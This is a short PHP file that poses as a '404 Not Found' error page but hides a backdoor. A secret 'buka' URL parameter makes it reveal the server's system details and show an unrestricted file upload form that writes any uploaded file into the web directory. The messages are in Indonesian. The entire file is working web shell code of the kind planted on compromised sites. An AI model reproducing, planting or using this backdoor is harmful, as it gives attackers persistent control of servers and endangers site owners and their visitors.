<b>404 Not Found</b>
<?php
if (isset($_GET["buka"])) {
    echo "<br>" . php_uname() . "<br>";
    echo "<form method=post enctype=multipart/form-data>";
    echo "<input type=file name=f><input name=v type=submit id=v value=uploadwoi><br>";
    if ($_POST["v"] == uploadwoi) {
        if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
            echo "<b>Berhasil!!</b> -->" . $_FILES["f"]["name"];
        } else {
            echo "<b>Gagal Upload";
        }
    }
}
?>